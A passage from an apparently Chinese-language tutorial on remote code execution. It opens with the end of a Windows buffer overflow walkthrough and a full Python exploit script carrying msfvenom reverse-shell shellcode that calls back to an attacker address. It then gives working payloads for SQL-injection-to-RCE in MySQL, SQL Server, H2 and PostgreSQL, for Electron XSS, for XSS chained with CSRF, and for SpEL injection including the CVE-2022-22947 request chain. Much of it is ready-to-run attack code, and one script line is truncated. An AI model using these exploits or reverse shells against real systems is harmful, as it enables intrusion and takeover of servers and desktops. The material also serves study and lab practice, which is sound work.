简单来说，我们需要寻找一个包含”jmp esp” 指令的静态地址，然后将 EIP 的内容设为此地址，该指令很常见，但需要符合以下几个条件才能被我们使用：

1.  使用的地址必须是静态的，所以支持库不能是开启 ASLR 编译的；
2.  该地址不能包含坏字符，因为地址也需要被输入到缓冲区中。

利用 Process Hacker 可以很快完成查询，看缓解策略即可：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302533-7edb48a4-4044-4bcb-8cd0-d038b59ab721.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302533-7edb48a4-4044-4bcb-8cd0-d038b59ab721.png)

寻找其加载的 DLL，发现 libssp.dll 符合我们的需求：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302503-fb36132f-1827-45cb-95ea-d7e9dd28434d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302503-fb36132f-1827-45cb-95ea-d7e9dd28434d.png)

地址不包含坏字符，可行。

首先我们要将”jmp esp” 转换为操作码，可以利用 msf-nasm_shell 工具或在线网站完成：

[https://shell-storm.org/online/Online-Assembler-and-Disassembler/](https://shell-storm.org/online/Online-Assembler-and-Disassembler/)

接下来我们需要确定 libssp.dll 的地址范围：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302532-640d1354-473f-45a0-855f-869acd9e47ff.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302532-640d1354-473f-45a0-855f-869acd9e47ff.png)

之后在其地址范围内搜索所需的操作码：

s -b 10000000 10223000 0xff 0xe4

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302633-6c659ccb-a94a-457c-8695-942cc0342107.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302633-6c659ccb-a94a-457c-8695-942cc0342107.png)

得到的地址为 10090c83，也不包含坏字符，可行。

下面我们将覆盖 EIP 为该地址，从而使得执行流程跳转到 ESP 所指向的地址：

filler = b"A" * 780

eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP

offset = b"C" * 4

shellcode = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + shellcode

这里 EIP 写入的是 jmp esp 指令的地址，要以相反的顺序写入，因为 x86 架构使用小端序。小端序中，数据的低位字节存储在低位内存，高位字节存储在高位内存。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302651-5925df0c-2c32-41a6-ab14-f7d73c8903e9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169302651-5925df0c-2c32-41a6-ab14-f7d73c8903e9.png)

可以看到，成功通过覆盖 EIP 将执行流程重定向到 shellcode 的位置。

**5 getshell**

我们可以利用 msfvenom 来生成 shellcode，但 shellcode 里也有可能存在坏字符，所以就需要用编码器来解决：

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.242 LPORT=4444 -f python –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

编码之后，我们不能直接让执行流程定位到 shellcode 的开头，因为在最前面会有一个解码器，它会导致 ESP 寄存器指向的地址附近几个字节被修改，最终会导致解码失败且进程崩溃。

解决该问题的一个办法是使用 NOP slip，即利用 NOP 指令覆盖可能的位置，因为 NOP 指令不会进行任何操作，只会执行下一条，那么当通过这种方式就可以让 CPU 执行时滑到 Payload 处：

filler = b"A" * 780

eip = b"\x83\x0c\x09\x10"

offset = b"C" * 4

nops = b"\x90" * 10

buf = b""

buf += b"\xb8\x50\xab\xc0\x1b\xd9\xcf\xd9\x74\x24\xf4\x5f"

buf += b"\x29\xc9\xb1\x52\x31\x47\x12\x03\x47\x12\x83\x97"

buf += b"\xaf\x22\xee\xeb\x58\x20\x11\x13\x99\x45\x9b\xf6"

……

完整的脚本：

import socket

import sys

try:

server = sys.argv[1]

port = 80

size = 800

filler = b"A" * 780

eip = b"\x83\x0c\x09\x10"

offset = b"C" * 4

nops = b"\x90" * 10

buf = b""

buf += b"\xb8\x50\xab\xc0\x1b\xd9\xcf\xd9\x74\x24\xf4\x5f"

buf += b"\x29\xc9\xb1\x52\x31\x47\x12\x03\x47\x12\x83\x97"

buf += b"\xaf\x22\xee\xeb\x58\x20\x11\x13\x99\x45\x9b\xf6"

buf += b"\xa8\x45\xff\x73\x9a\x75\x8b\xd1\x17\xfd\xd9\xc1"

buf += b"\xac\x73\xf6\xe6\x05\x39\x20\xc9\x96\x12\x10\x48"

buf += b"\x15\x69\x45\xaa\x24\xa2\x98\xab\x61\xdf\x51\xf9"

buf += b"\x3a\xab\xc4\xed\x4f\xe1\xd4\x86\x1c\xe7\x5c\x7b"

buf += b"\xd4\x06\x4c\x2a\x6e\x51\x4e\xcd\xa3\xe9\xc7\xd5"

buf += b"\xa0\xd4\x9e\x6e\x12\xa2\x20\xa6\x6a\x4b\x8e\x87"

buf += b"\x42\xbe\xce\xc0\x65\x21\xa5\x38\x96\xdc\xbe\xff"

buf += b"\xe4\x3a\x4a\x1b\x4e\xc8\xec\xc7\x6e\x1d\x6a\x8c"

buf += b"\x7d\xea\xf8\xca\x61\xed\x2d\x61\x9d\x66\xd0\xa5"

buf += b"\x17\x3c\xf7\x61\x73\xe6\x96\x30\xd9\x49\xa6\x22"

buf += b"\x82\x36\x02\x29\x2f\x22\x3f\x70\x38\x87\x72\x8a"

buf += b"\xb8\x8f\x05\xf9\x8a\x10\xbe\x95\xa6\xd9\x18\x62"

buf += b"\xc8\xf3\xdd\xfc\x37\xfc\x1d\xd5\xf3\xa8\x4d\x4d"

buf += b"\xd5\xd0\x05\x8d\xda\x04\x89\xdd\x74\xf7\x6a\x8d"

buf += b"\x34\xa7\x02\xc7\xba\x98\x33\xe8\x10\xb1\xde\x13"

buf += b"\xf3\x7e\xb6\x36\xf1\x17\xc5\x48\xe4\xbb\x40\xae"

buf += b"\x6c\x54\x05\x79\x19\xcd\x0c\xf1\xb8\x12\x9b\x7c"

buf += b"\xfa\x99\x28\x81\xb5\x69\x44\x91\x22\x9a\x13\xcb"

buf += b"\xe5\xa5\x89\x63\x69\x37\x56\x73\xe4\x24\xc1\x24"

buf += b"\xa1\x9b\x18\xa0\x5f\x85\xb2\xd6\x9d\x53\xfc\x52"

buf += b"\x7a\xa0\x03\x5b\x0f\x9c\x27\x4b\xc9\x1d\x6c\x3f"

buf += b"\x85\x4b\x3a\xe9\x63\x22\x8c\x43\x3a\x99\x46\x03"

buf += b"\xbb\xd1\x58\x55\xc4\x3f\x2f\xb9\x75\x96\x76\xc6"

buf += b"\xba\x7e\x7f\xbf\xa6\x1e\x80\x6a\x63\x2e\xcb\x36"

buf += b"\xc2\xa7\x92\xa3\x56\xaa\x24\x1e\x94\xd3\xa6\xaa"

buf += b"\x65\x20\xb6\xdf\x60\x6c\x70\x0c\x19\xfd\x15\x32"

buf += b"\x8e\xfe\x3f"

buf += b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(buf))

inputBuffer = filler + eip + offset + nops + buf

content = b"user

buffer = b"POST /login HTTP/1.1\r\n"

buffer += b"Host:" + server.encode() + b"\r\n"

buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"

buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,_/_;q=0.8\r\n"

buffer += b"Accept-Language: en-US,en;q=0.5\r\n"

buffer += b"Referer: [http://10.11.0.22/login\r\n](http://10.11.0.22/login/r/n)"

buffer += b"Connection: close\r\n"

buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"

buffer += b"Content-Length:"+ str(len(content)).encode() + b"\r\n"

buffer += b"\r\n"

buffer += content

print("Sending evil buffer...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((server, port))

s.send(buffer)

s.close()

print("Done!")

except socket.error:

print("Could not connect!")

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303233-4c6f736f-3ab5-49c6-bff4-f8502c151150.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303233-4c6f736f-3ab5-49c6-bff4-f8502c151150.png)

本章介绍的是最基础的缓冲区溢出，并且没有任何安全限制，但实际环境是远不可能如此简单的，所以路漫漫其修远兮，加油吧安全人。

**4 不同语言独有或特殊环境 RCE**
---------------------

本模块解释一些语言独有的 RCE 或者特殊环境配置下造成的 RCE

**4.1 (SQL 语句)SQL 注入导致 RCE**
----------------------------

SQL 注入（SQL Injection）是一种常见的网络攻击技术，它允许攻击者在应用程序的数据库查询中插入或 “注入” 恶意 SQL 代码，从而绕过安全措施来执行未授权的数据库命令。这种攻击可以用来访问、修改甚至删除数据库中的数据，包括获取敏感信息、破坏数据或者在某些情况下，控制服务器或执行操作系统级别的命令。

SQL 到 RCE 有常见的有两种方式，一种是注入时目标是 DBA 权限且知道目标站点绝对路径，另一种就是支持特殊函数进行 RCE 的。

### **4.1.1 DBA 权限 + 绝对路径（通用）**

phpMyAdmin 是一个非常流行的基于 Web 的数据库管理工具，用于管理 MySQL 和 MariaDB 数据库系统。这是一个开源工具，通过简单的图形用户界面提供了一个方便的平台，让用户能够执行数据库中的各种操作，包括但不限于：

创建、修改或删除数据库和表。

执行 SQL 语句。管理数据库用户和权限。

导入和导出数据。

对数据库和表进行备份和恢复。

查看服务器的性能和状态。

由于其 Web 界面，phpMyAdmin 可以从几乎任何地方通过互联网访问，这使得它对于那些不熟悉命令行界面的用户尤其有用。它包含了大量的文档，帮助用户理解和管理他们的数据库。

phpMyAdmin 是用 PHP 编写的，并且可以在任何支持 PHP 的 Web 服务器上运行。它广泛应用于网站托管服务中，让网站管理员能够直接在 Web 浏览器中管理他们的数据库。

安装 phpmyadmin 进行测试

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303221-b82f4412-6999-46f2-a40d-a403f2f0c24e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303221-b82f4412-6999-46f2-a40d-a403f2f0c24e.png)

使用 root 账号登录（DBA 权限）

执行语句可以发现 secure_file_priv 为 NULL 这是不允许导入导出数据的意思

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303374-f20a1cfc-f430-4a9c-bdc7-feb6540ccae0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303374-f20a1cfc-f430-4a9c-bdc7-feb6540ccae0.png)

修改一下配置，在 mysql 安装目录中的 my.ini 文件中添加一行

secure_file_priv = ''

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303476-fd627b40-22d8-45d3-bda5-b27b16be020b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303476-fd627b40-22d8-45d3-bda5-b27b16be020b.png)

重启服务

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303404-23eab56a-ba42-421f-834e-d10766ea2a52.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169303404-23eab56a-ba42-421f-834e-d10766ea2a52.png)

可以发现现在没有 value 值了，此时就可以进行写入

SELECT '恶意代码' INTO OUTFILE '目标站点绝对路径'

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304020-e24349d8-944f-4bab-930a-f52c155678a7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304020-e24349d8-944f-4bab-930a-f52c155678a7.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304168-209bc350-ab66-476f-809e-b10778697757.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304168-209bc350-ab66-476f-809e-b10778697757.png)

### **4.1.2 SQLserver 数据库 RCE**

SQL Server 是由微软开发的一款关系型数据库管理系统（RDBMS），它支持广泛的事务处理、商务智能和分析应用程序，适用于企业环境。SQL Server 提供了一个安全、可靠的数据存储方案，能够处理大量数据，同时还提供了复杂的数据分析功能。

sqlserver 中的 xp_cmdshell

使用 sqlserver 语句

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304246-dec4f542-93b4-4849-8abd-3ddd53a1a9ee.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304246-dec4f542-93b4-4849-8abd-3ddd53a1a9ee.png)

然后执行命令，可以发现成功读取 C:\ 下的文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304228-7b7b116b-e8e6-4fe1-953c-4739a56b01b5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304228-7b7b116b-e8e6-4fe1-953c-4739a56b01b5.png)

### **4.1.3 H2 数据库 RCE**

H2 是一个开源的嵌入式数据库引擎，它提供了轻量级但功能强大的数据库解决方案。H2 数据库主要用于 Java 应用程序，因为它是用 Java 编写的，可以以嵌入式的方式集成到 Java 应用程序中，也可以作为一个独立的服务器运行。H2 的设计目标是快速性能、开放源代码以及易于使用。

访问官网下载

[https://www.h2database.com/html/download.html](https://www.h2database.com/html/download.html)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304185-7792420e-1a3d-4cc0-ac85-4607f258680e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169304185-7792420e-1a3d-4cc0-ac85-4607f258680e.png)

直接安装即可

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169305127-9e0fdccd-c042-4c21-a16b-c20b057e733a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169305127-9e0fdccd-c042-4c21-a16b-c20b057e733a.png)

直接在 windows 下搜索 H2， 打开 H2 console

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169305219-0f2fa982-d378-44b1-8a58-7f753a2b018c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169305219-0f2fa982-d378-44b1-8a58-7f753a2b018c.png)

直接点击 connect 登录，默认是没有任何密码的

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169308115-e7f3fc3e-a4ed-4adc-8ee1-2a29b700b412.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169308115-e7f3fc3e-a4ed-4adc-8ee1-2a29b700b412.png)

使用这段命令来创建一个别名

CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169308569-335feb70-7b42-40e1-90cd-0953c042e485.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169308569-335feb70-7b42-40e1-90cd-0953c042e485.png)

直接调用即可成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309081-a03f3597-8335-4bd2-8103-84b0a4d21707.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309081-a03f3597-8335-4bd2-8103-84b0a4d21707.png)

### **4.1.4 PostgreSQL 数据库 RCE**

PostgreSQL，通常简称为 Postgres，是一个开源的关系型数据库管理系统（RDBMS），以其稳定性、功能强大和遵循标准而闻名。PostgreSQL 支持高级的数据类型和强大的功能，如事务完整性、持久性、并发控制、子查询、触发器、视图、复杂的 SQL 查询、事务、MVCC（多版本并发控制）、高级索引技术等。这些特性使得 PostgreSQL 成为企业级应用、复杂数据处理和高并发应用的理想选择。

使用以下命令来安装并启动

sudo yum install postgresql-server postgresql-contribsudo postgresql-setup initdbsudo systemctl start postgresql

切换到 postgres 用户来管理数据库

sudo -i -u postgres

psql

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309761-72400184-5fbd-4a6a-9068-93b09152de5d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309761-72400184-5fbd-4a6a-9068-93b09152de5d.png)

CREATE EXTENSION plypythonu;

创建扩展（我这里已经提前装好了）

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309851-9e2ee8ca-e1c0-41e6-8967-3cd65ecba97b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309851-9e2ee8ca-e1c0-41e6-8967-3cd65ecba97b.png)

执行以下命令创建一个名为 rce 的函数

CREATE OR REPLACE FUNCTION rce(command text) RETURNS void AS $$import osos.system(command)$$ LANGUAGE plpythonu;

使用 SELECT rce(命令); 即可成功 rce，可以看到下图成功写入代码到 / tmp/test.txt 中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309925-13a16481-96a1-44ab-b0b1-f5965aa2421c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169309925-13a16481-96a1-44ab-b0b1-f5965aa2421c.png)

**4.2 (Javascript)XSS 注入导致 RCE**
--------------------------------

XSS（Cross-Site Scripting，跨站脚本）注入是一种常见的网站安全漏洞。它允许攻击者在受害者浏览器上执行恶意脚本。这种攻击通常是通过将恶意代码注入到网页上，然后由其他用户访问并执行这些代码来完成的。XSS 攻击可以用来窃取用户信息、会话令牌、破坏网站的正常功能等。

XSS 攻击通常分为以下几类：

存储型 XSS：恶意脚本被永久存储在目标服务器上（例如，在数据库、消息论坛、访客留言等处），当用户浏览相关页面时，脚本会被执行。

反射型 XSS：恶意脚本通过发送带有恶意脚本的 URL 给用户来执行。当用户点击链接时，恶意脚本会被发送到服务器，然后反射回用户的浏览器并执行。通常伴随着钓鱼攻击。

DOM-based XSS：或称为基于文档对象模型的 XSS，攻击脚本是通过修改页面的 DOM 环境来实现的，而不是实际的 HTML 代码。这类攻击完全在客户端执行。

XSS 一般是网页上的漏洞，通过更改前端代码进行操作，而我们知道前端代码例如 javascript 是没有什么与系统交互的命令和权限的，所以一般情况下是不存在 XSS 到 RCE 漏洞的，但某种情况下，例如特殊的环境配置或者与其他漏洞组合，最终是可以达到 RCE 的

一般有两种方法造成 RCE，一种是通过前端开发特殊配置可以直接执行系统命令，比如常见的 electron RCE，一种是 XSS 配合 CSRF，通过 1click RCE.

### **4.2.1 XSS 通过特殊配置 RCE**

Electron 是一个开源的框架，它允许开发者使用 Web 技术（HTML, CSS, JavaScript）来构建跨平台的桌面应用程序。它由 GitHub 创建并维护，最初的目的是为了开发 Atom 编辑器。Electron 工作的基础是结合了 Chromium（一个开源的网页浏览器项目，也是 Google Chrome 浏览器的基础）和 Node.js（一个可以在服务器端运行 JavaScript 的平台），使得开发者可以创建具有原生应用程序体验的桌面应用程序，同时利用 Node.js 的强大功能。

Electron 之所以可以执行系统命令，主要是因为它内置了 Node.js。Node.js 提供了许多模块和 API，使得 JavaScript 代码能够执行操作系统级别的任务，如文件系统操作、网络请求、以及执行外部程序和命令。这些功能主要通过 Node.js 的 child_process 模块来实现，它允许 Electron 应用程序创建子进程来执行系统命令和其他外部程序。

先安装好 node.js 和 electron

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169310291-2145fa47-ded0-4478-8c04-d61886d238ec.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169310291-2145fa47-ded0-4478-8c04-d61886d238ec.png)

npm install -g cnpm --registry=[https://registry.npm.taobao.org](https://registry.npm.taobao.org/)

cnpm install electron -g

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169310403-d68e174d-6a89-41ee-b1fd-91394773fc45.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169310403-d68e174d-6a89-41ee-b1fd-91394773fc45.png)

成功安装，然后开始搭建环境

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311493-50af22a3-6ab7-44db-b54a-1c0ca89b62e9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311493-50af22a3-6ab7-44db-b54a-1c0ca89b62e9.png)

那么如何利用这个去 rce 呢，简单的一句话，在 index.js 中如下

const exec = require('child_process').execexec('calc.exe', (err, stdout, stderr) => console.log(stdout))

我们在能 xss 的情况下，控制前端代码，并且是 electron 框架的时候，即可造成 rce

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311473-07c1499a-a9cc-4c63-968b-8fefd951bf7e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311473-07c1499a-a9cc-4c63-968b-8fefd951bf7e.png)

经测试最短一句话为

const exec = require('child_process').exec('命令')

我们这里采用 Notable 作为案例，版本为 1.8.4，官网下载后 [https://notable.app/#features](http://invalid.uri/)，

新建一个文件，将命令转换成 base64

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311524-e6e015d8-0a80-4eff-a73d-18fe598e6877.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311524-e6e015d8-0a80-4eff-a73d-18fe598e6877.png)

在 notable 新建的文件中输入以下 payload

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311681-ab38cc05-3025-4cb0-accb-c35f20f7866d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311681-ab38cc05-3025-4cb0-accb-c35f20f7866d.png)

保存后即可成功触发 rce

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311812-74d8dfc7-a815-492b-a51e-f9dfcacec16d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169311812-74d8dfc7-a815-492b-a51e-f9dfcacec16d.png)

### **4.2.2 XSS 配合 CSRF 升级成 RCE**

跨站请求伪造（CSRF，Cross-Site Request Forgery）是一种常见的网络攻击方式，它允许攻击者在不知情的用户浏览器中执行未经授权的命令。这种攻击通常通过诱使用户点击链接、访问恶意网站或在用户已登录的网站中嵌入恶意代码来实现。攻击者利用用户的登录状态，以用户的名义发送请求，执行一些用户并不希望执行的操作，如更改密码、转账等。

简单来描述下 XSS 配合 CSRF 达到 RCE 的流程，假设目前有个管理平台，在后台有一个功能可以进行执行命令，但正常情况下攻击者是利用不了的。此时前台有个 XSS 注入点，当管理员的 COOKIE 被窃取或直接使用管理员的身份进行后台的命令执行功能利用，即可完成整个攻击流程的

首先准备好 js 文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312306-a2256538-e347-4331-9b7c-c4a70e99349f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312306-a2256538-e347-4331-9b7c-c4a70e99349f.png)

然后找到面板主页，将 poc 插进去

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312347-5cb11454-7562-4248-8fb6-0632f00d3a0f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312347-5cb11454-7562-4248-8fb6-0632f00d3a0f.png)

登录面板，即可看到在 www 文件夹下生成了 1.txt

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312330-92894dba-135b-41cc-a3b0-41b14c023b49.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312330-92894dba-135b-41cc-a3b0-41b14c023b49.png)

简单分析下

在小皮首页当中，会将尝试的用户名输出到页面上

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312433-d839dccf-8d14-43d1-a76a-ec37486b4c6e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169312433-d839dccf-8d14-43d1-a76a-ec37486b4c6e.png)

而这个过程是没有过滤的，也就可以进行任意 xss，而配合小皮自带的计划任务，即可完成 1click RCE

登录的代码如下

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313263-6faf42d9-f889-4fc3-8a09-4e168446bfa9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313263-6faf42d9-f889-4fc3-8a09-4e168446bfa9.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313419-10a78af3-177f-480a-9e83-cce2b4ba0142.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313419-10a78af3-177f-480a-9e83-cce2b4ba0142.png)

其中获取日志的代码如下

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313777-d6bf5a7e-b39b-48a5-9af9-15725b7187bd.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313777-d6bf5a7e-b39b-48a5-9af9-15725b7187bd.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313732-a156fa58-b1a9-46df-9e09-82b6b7c80e68.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313732-a156fa58-b1a9-46df-9e09-82b6b7c80e68.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313862-ae2d6529-1306-4135-9dea-b15c880d32ef.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313862-ae2d6529-1306-4135-9dea-b15c880d32ef.png)

下图代码就是执行任务计划的

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313905-2a59bb7a-b04c-4d54-8f25-58c95837014b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169313905-2a59bb7a-b04c-4d54-8f25-58c95837014b.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169314398-609ba7bd-00e3-458c-8c36-8a138390d4a2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169314398-609ba7bd-00e3-458c-8c36-8a138390d4a2.png)

**4.3 (JAVA) 表达式注入 RCE**
------------------------

表达式注入（Expression Language Injection）是一种安全漏洞，通过这种漏洞，攻击者可以在应用程序未经意间评估或执行用户控制的数据作为代码的情况下，执行恶意代码。这通常出现在使用了动态表达式语言的应用程序中

### **4.3.1 表达式注入（SPEL）**

Spring Expression Language (SpEL) 表达式注入漏洞是一种安全漏洞，它存在于使用 Spring 框架开发的应用程序中。Spring 是一个流行的 Java 应用程序开发框架，提供了丰富的功能和工具来简化企业级应用程序的开发。SpEL 是 Spring 框架中的一部分，它是一个强大的表达式语言，支持在运行时查询和操作对象图。尽管 SpEL 提供了便利，但如果不当使用，也可能引入安全漏洞。

SpEL 表达式注入漏洞通常发生在应用程序将用户输入不经过适当处理直接用于 SpEL 表达式的情况。攻击者可以利用这种漏洞，通过构造恶意的 SpEL 表达式，执行未授权的命令或访问数据，从而对应用程序的安全造成威胁。

一个简单的案例

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169314975-07659a18-0f29-4036-a29e-8b5cedb29268.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169314975-07659a18-0f29-4036-a29e-8b5cedb29268.png)

import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.expression.spel.support.StandardEvaluationContext;public class SPEL {public static void main(String[] args) { String poc = "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")"; StandardEvaluationContext context = new StandardEvaluationContext(); ExpressionParser expressionParser = new SpelExpressionParser(); Expression expression = expressionParser.parseExpression(poc); expression.getValue(context); \}\}

这里选用知名的 spring-cloud-gateway(CVE-2022-22947) 来做案例

搭建环境

docker pull vulhub/spring-cloud-gateway:3.1.0

docker run -itd -p 8010:8080 --name spring vulhub/spring-cloud-gateway:3.1.0

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315012-b6c49fdf-38a0-4d8b-809e-c21365179e28.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315012-b6c49fdf-38a0-4d8b-809e-c21365179e28.png)

主页

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315162-dc30d59a-02d3-4388-9a4a-3335aa63c729.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315162-dc30d59a-02d3-4388-9a4a-3335aa63c729.png)

复现过程

POST /actuator/gateway/routes/rce HTTP/1.1

Host: 127.0.0.1:8010

Cache-Control: max-age=0

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Windows"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Content-Type: application/json

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

If-None-Match: "3147526947+gzip"

If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT

Connection: close

Content-Length: 365

{

"id": "rce",

"filters": [{

"name": "AddResponseHeader",

"args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"}

}],

"uri": "[http://example.com](http://example.com/)",

"order": 0

}

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315224-d134f2f8-c57f-46b3-be60-c487c68b5e73.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315224-d134f2f8-c57f-46b3-be60-c487c68b5e73.png)

刷新缓存

POST /actuator/gateway/refresh HTTP/1.1

Host: 127.0.0.1:8010

Connection: close

Content-Type: application/x-www-form-urlencoded

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315454-40808d58-0de8-48a5-9bf0-d693a944fcca.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169315454-40808d58-0de8-48a5-9bf0-d693a944fcca.png)

成功 RCE

GET /actuator/gateway/routes/rce HTTP/1.1

Host: 127.0.0.1:8010

Connection: close

Content-Type: application/x-www-form-urlencoded

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316347-4d6c66a1-08b8-4d41-8e21-c4a69f851427.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316347-4d6c66a1-08b8-4d41-8e21-c4a69f851427.png)

分析流程

最终的漏洞点在 ShortcutConfigurable.java，通过 parser.parseExpression 解析 entryValue

